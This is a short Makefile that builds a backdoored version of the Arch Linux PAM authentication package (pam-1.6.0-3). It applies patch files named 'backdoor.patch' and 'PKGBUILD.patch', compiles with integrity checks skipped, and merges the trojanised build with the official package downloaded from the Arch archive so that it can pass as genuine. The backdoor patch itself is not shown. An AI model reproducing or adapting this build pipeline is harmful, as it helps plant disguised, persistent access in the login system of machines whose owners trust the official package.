default: merge-packages

apply-backdoor-patches: PKGBUILD.patch backdoor.patch
	cd pam && git apply ../PKGBUILD.patch
	cp backdoor.patch pam

compile-backdoor: apply-backdoor-patches
	cd pam && makepkg --skipinteg -c

download-official-package:
	wget https://archive.archlinux.org/packages/p/pam/pam-1.6.0-3-x86_64.pkg.tar.zst

merge-packages: compile-backdoor download-official-package
	cp pam-1.6.0-3-x86_64.pkg.* merged/pam-1.6.0-3-x86_64-org.pkg.tar.zst
	cp pam/pam-1.6.0-3-x86_64.pkg.* merged/pam-1.6.0-3-x86_64-mal.pkg.tar.zst
	cd merged && makepkg --skipinteg -c

clean:
	rm pam-1.6.0-3-x86_64.pkg.tar.zst
	rm merged/pam-*
	cd pam && git reset --hard
	rm pam/Linux-PAM*
	rm pam/backdoor.patch
	rm pam/pam-*